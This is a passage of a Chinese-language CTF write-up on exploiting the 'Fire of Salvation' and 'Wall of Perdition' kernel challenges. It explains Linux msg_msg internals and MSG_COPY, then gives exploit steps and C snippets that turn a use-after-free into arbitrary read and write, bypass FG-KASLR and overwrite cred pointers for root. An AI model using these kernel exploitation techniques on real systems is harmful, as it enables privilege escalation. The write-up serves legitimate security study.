        if (msgflg & MSG_COPY) {
            if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))
                return -EINVAL;
            copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax)); // [4]
            if (IS_ERR(copy))
                return PTR_ERR(copy);
        }
        mode = convert_mode(&msgtyp, msgflg);
        rcu_read_lock();
        msq = msq_obtain_object_check(ns, msqid);
        ... ...
        for (;;) {
            struct msg_receiver msr_d;
            msg = ERR_PTR(-EACCES);
            if (ipcperms(ns, &msq->q_perm, S_IRUGO))
                goto out_unlock1;
            ipc_lock_object(&msq->q_perm);
            /* raced with RMID? */
            if (!ipc_valid_object(&msq->q_perm)) {
                msg = ERR_PTR(-EIDRM);
                goto out_unlock0;
            }
            msg = find_msg(msq, &msgtyp, mode);     // [1] 调用 find_msg() 来定位正确的消息。之后检查并unlink消息。
            if (!IS_ERR(msg)) {
                /*
                 * Found a suitable message.
                 * Unlink it from the queue.
                 */
                if ((bufsz m_ts) && !(msgflg & MSG_NOERROR)) {
                    msg = ERR_PTR(-E2BIG);
                    goto out_unlock0;
                }
                /*
                 * If we are copying, then do not unlink message and do
                 * not update queue parameters.
                 */
                if (msgflg & MSG_COPY) {
                    msg = copy_msg(msg, copy);         // [5] 若设置了MSG_COPY，则跳出循环，避免unlink
                    goto out_unlock0;
                }
                list_del(&msg->m_list);
                ... ...
        }
    out_unlock0:
        ipc_unlock_object(&msq->q_perm);
        wake_up_q(&wake_q);
    out_unlock1:
        rcu_read_unlock();
        if (IS_ERR(msg)) {
            free_copy(copy);
            return PTR_ERR(msg);
        }
        bufsz = msg_handler(buf, msg, bufsz);     // [2] 调用 do_msg_fill() 把消息从内核拷贝到用户。具体代码如下所示
        free_msg(msg);                             // [3] 拷贝完成后，释放消息。
        return bufsz;
    }
**消息拷贝** ：
[do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018)
->
[store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150)
。和创建消息的过程一样，先拷贝消息头（`msg_msg`结构对应的数据），再拷贝segment（`msg_msgseg`结构对应的数据）。
    static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz)
    {
        struct msgbuf __user *msgp = dest;
        size_t msgsz;
        if (put_user(msg->m_type, &msgp->mtype))
            return -EFAULT;
        msgsz = (bufsz > msg->m_ts) ? msg->m_ts : bufsz;     // [1] 检查请求的数据长度是否大于 msg->m_ts ，超过则只能获取 msg->m_ts 长度的数据（为了避免越界读）。本例中，msgsz 为0x1fc8字节，
        if (store_msg(msgp->mtext, msg, msgsz))             // [2] 最后调用 store_msg()将 msgsz也即0x1fc8字节拷贝到用户空间，代码如下所示
            return -EFAULT;
        return msgsz;
    }
    int store_msg(void __user *dest, struct msg_msg *msg, size_t len)
    {
        size_t alen;
        struct msg_msgseg *seg;
        alen = min(len, DATALEN_MSG);                 // [1] 和创建消息的过程一样，alen=0xfd0
        if (copy_to_user(dest, msg + 1, alen))         // [2] 先拷贝消息头
            return -1;
        for (seg = msg->next; seg != NULL; seg = seg->next) { // [3] 遍历其他segment
            len -= alen;
            dest = (char __user *)dest + alen;
            alen = min(len, DATALEN_SEG);             // [4] 本例中为0xff8
            if (copy_to_user(dest, seg + 1, alen))     // [5] 再拷贝segment
                return -1;
        }
        return 0;
    }
**消息释放**
：[store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150)
。先释放消息头，再释放segment。
    void free_msg(struct msg_msg *msg)
    {
        struct msg_msgseg *seg;
        security_msg_msg_free(msg);
        seg = msg->next;
        kfree(msg);              // [1] 释放 msg_msg
        while (seg != NULL) {     // [2] 释放 msg_msgseg
            struct msg_msgseg *tmp = seg->next;
            cond_resched();
            kfree(seg);         // [3]
            seg = tmp;
        }
    }
**[MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)**
：见 [do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090)
中 `[4]`处，如果用flag
[MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)来调用
`msgrcv()` （内核编译时需配置`CONFIG_CHECKPOINT_RESTORE`选项，默认已配置），就会调用
[prepare_copy()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1037)
分配临时消息，并调用
[copy_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L118)
将请求的数据拷贝到该临时消息（见
[do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090) 中
`[5]`处）。在将消息拷贝到用户空间之后，原始消息会被保留，不会从队列中unlink，然后调用`free_msg()`删除该临时消息，这对于利用很重要。
为什么？因为本漏洞在第一次UAF的时候，没有泄露正确地址，所以会破坏`msg_msg->m_list`双链表指针，unlink会触发崩溃。本题的UAF会破坏前16字节，如果某漏洞可以跳过前16字节，是否不需要注意这一点？
    void *memdump = malloc(0x1fc8);
    msgrcv(qid, memdump, 0x1fc8, 1, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
* * *
## 3\. Fire of Salvation 简单模式利用
**特点** ：大小为`kmalloc-4096`的UAF。
**任意读** ：`hardened_usercopy`
机制不允许修改size越界读写。可利用UAF篡改`msg_msg->m_ts`和`msg_msg->next`（指向的下一个segment前8字节必须为null，避免遍历消息时出现访存崩溃）。
**任意写**
：创建一个需要多次分配堆块的消息（>0xfd0），在拷贝消息头（`msg_msg`结构）的时候利用userfault进行挂起，然后利用UAF篡改`msg_msg->next`指向目标地址，目标地址的前8字节必须为NULL（避免崩溃），解除挂起后就能实现任意写。任意写的原理如下图所示：
###  3.1 步骤1——泄露内核基址
**泄露内核基址** ：由于开启了`FG-KASLR`，只能喷射大量[shm_file_data](https://elixir.bootlin.com/linux/v5.8/source/ipc/shm.c#L74)对象（kmalloc-32）来泄露地址，因为`FG-KASLR`是在boot时对函数和某些节进行二次随机化，而`shm_file_data->ns`这种指向全局结构的指针不会被二次随机化。我们可以传入消息来分配1个`kmalloc-4096`的消息头和1个`kmalloc-32`的segment，然后
**利用UAF改大`msg_msg->m_ts`，调用`msgrcv()`读内存**，这样就能越界读取多个`kmalloc-32`结构，泄露地址。注意，需使用`MSG_COPY`
flag避免unlink时崩溃。原理如下图所示：
###  3.2 步骤2——泄露cred地址
**泄露cred地址** ：再次利用任意读，从`init_task`开始找到当前进程的`task_struct`（也可以调用 prctl
`SET_NAME`来设置`comm`成员，以此标志来暴搜，详见 [Google CTF Quals 2021 Fullchain
writeup](https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308)）。本题提供了vmlinux符号信息，`task_struct->tasks`偏移是0x398，该位置的前8字节为null，可以当作1个segment；`real_cred`和`cred`指针在偏移0x538和0x540处，前面8字节也是null。
**利用UAF改大`msg_msg->m_ts`，将`msg_msg->next`改为`&task_struct+0x298-8`，调用`msgrcv()`读内存**。
### 3.3 步骤3——篡改`cred & real_cred`指针
**篡改`cred & real_cred`指针**：根据pid找到当前进程后，
**利用UAF篡改`msg_msg->next`指向`&real_cred-0x8`，调用`msgsnd()`写内存**，即可将`real_cred`和`cred`指针替换为`init_cred`即可提权。
* * *
## 4\. Wall of Perdition 复杂模式利用
**特点** ：大小为`kmalloc-64`的UAF。
**现有的任意写、任意释放技术** ： [Four Bytes of Power: Exploiting CVE-2021-26708 in the
Linux kernel](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html)
中介绍了如何伪造`msg_msg->m_ts`来实现任意写，也通过`msg_msg->security`指针实现了任意释放，但是本题关闭了SELinux，则`msg_msg->security`指针总是指向NULL，本题不适用。
### 4.1 步骤1——越界读泄露内核基址、`msg_msg->m_list.next / prev`
**创建2个消息队列** ：
    [...]
    void send_msg(int qid, int size, int c)
    {
        struct msgbuf
        {
            long mtype;
            char mtext[size - 0x30];
        } msg;
        msg.mtype = 1;
        memset(msg.mtext, c, sizeof(msg.mtext));
        if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
        {
            perror("msgsnd");
            exit(1);
        }
    }
    [...]
    // [1] 先调用msgget()创建两个队列，第一个标记为QID #0，第二个标记为QID #1。
    if ((qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("msgget");
        exit(1);
    }
    if ((qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("msgget");
        exit(1);
    }
    // [2] 调用 add_rule() 向firewall_rules_in添加inbound规则，再调用 duplicate_rule() 复制到 firewall_rule_out，释放后还能从 firewall_rule_out[1] 访问，触发UAF
    add_rule(0, buff, INBOUND);
    duplicate_rule(0, INBOUND);
    delete_rule(0, INBOUND);
    send_msg(qid[0], 0x40, 'A'); // [3] 调用send_msg()，也即对msgsnd()的包装函数，分配3个消息。第1个大小为0x40, 位于队列 QID #0, 由于和刚刚释放的rule位于同一个kmalloc-64，所以能修改该消息的msg_msg头结构。
    send_msg(qid[1], 0x40, 'B'); // [4] 第2个消息在队列QID #1中，大小为0x40字节
    send_msg(qid[1], 0x1ff8, 0); // [5] 第3个消息在队列QID #1中，大小为0x1ff8字节
    [...]
**消息布局** ： **QID #0** 消息队列——橘色部分是第1个消息，堆块大小0x40，可通过 `edit_rule()` 完全控制。 **QID
#1** 消息队列——第1个消息，堆块大小为0x40，其 `msg_msg->m_list.prev` 指向消息队列 **QID #1**
，`m_list.next`指向第2个消息，占两个`kmalloc-4096`。
**泄露内存** ： **利用UAF改大 QID #0 队列的消息`msg_msg->m_ts`，调用`msgrcv()`越界读取** **QID #0**
队列的第1个消息，`m_list.next` （指向下一个消息 `kmalloc-4096`）和 `m_list.prev` （指向 **`QID
#1`** 队列），最后我们还能泄露
[`sysfs_bin_kfops_ro`](https://elixir.bootlin.com/linux/v5.8/source/fs/sysfs/file.c#L226)，由于该符号位于内核的data节，所以不受FG-KASLR保护的影响，所以可以用来计算内核基址。
    [...]
    void *recv_msg(int qid, size_t size)
    {
        void *memdump = malloc(size);
        if (msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -1)
        {
            perror("msgrcv");
            return NULL;
        }
        return memdump;
    }
    [...]
    uint64_t *arb_read(int idx, uint64_t target, size_t size, int overwrite)
    {
        struct evil_msg *msg = (struct evil_msg *)malloc(0x100);
        msg->m_type =  0;
        msg->m_ts = size;                         // [2] 调用edit_rule()覆盖目标对象的 m_ts 域